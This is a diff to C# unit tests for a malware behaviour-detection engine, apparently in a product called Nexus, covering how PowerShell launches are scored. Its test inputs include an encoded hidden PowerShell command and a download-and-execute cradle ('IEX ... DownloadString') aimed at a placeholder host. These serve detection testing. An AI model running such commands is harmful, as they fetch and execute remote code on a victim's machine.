@@ -128,8 +128,50 @@ public class BehaviorEngineTests
             @"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
             "powershell -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA"));
 
-        Assert.Contains("beh-lolbin-powershell", codes);
+        Assert.Contains("beh-lolbin-powershell-encoded", codes);
         Assert.Contains("beh-encoded-commandline", codes);
+    }
+
+    /// <summary>
+    /// The command line Nexus itself uses to query Defender and enumerate scheduled
+    /// tasks. Every installer and build script on earth looks like this, so if it
+    /// reaches the alert threshold the feature is noise — and Nexus was reporting its
+    /// own helper processes as strongly suspicious.
+    /// </summary>
+    [Fact]
+    public void An_ordinary_noprofile_bypass_invocation_does_not_reach_an_alert()
+    {
+        var finding = new BehaviorEngine().Observe(Launch(
+            @"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
+            "powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -Command \"Get-MpComputerStatus\""));
+
+        Assert.NotNull(finding);
+
+        var verdict = VerdictEngine.Evaluate(new VerdictInput
+        {
+            Target = finding.Target,
+            Signals = finding.Signals,
+            EnginesConsulted = new HashSet<SignalSource> { SignalSource.Behavior },
+        }, Now);
+
+        Assert.False(verdict.WarrantsAlert,
+            $"an ordinary -NoProfile/-Bypass launch reached {verdict.Level} at {verdict.Score}/100");
+    }
+
+    [Theory]
+    [InlineData("powershell -NoProfile -Command Get-Date", "beh-lolbin-powershell-policy", SignalWeight.Weak)]
+    [InlineData("powershell -w hidden -Command Start-Thing", "beh-lolbin-powershell-hidden", SignalWeight.Moderate)]
+    [InlineData("powershell -Command \"IEX(New-Object Net.WebClient).DownloadString('http://x')\"",
+        "beh-lolbin-powershell-encoded", SignalWeight.Strong)]
+    public void Powershell_is_graded_by_what_the_command_line_actually_does(
+        string commandLine, string expectedCode, SignalWeight expectedWeight)
+    {
+        var finding = new BehaviorEngine().Observe(
+            Launch(@"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe", commandLine));
+
+        Assert.NotNull(finding);
+        var signal = Assert.Single(finding.Signals, s => s.Code == expectedCode);
+        Assert.Equal(expectedWeight, signal.Weight);
     }
 
     [Theory]
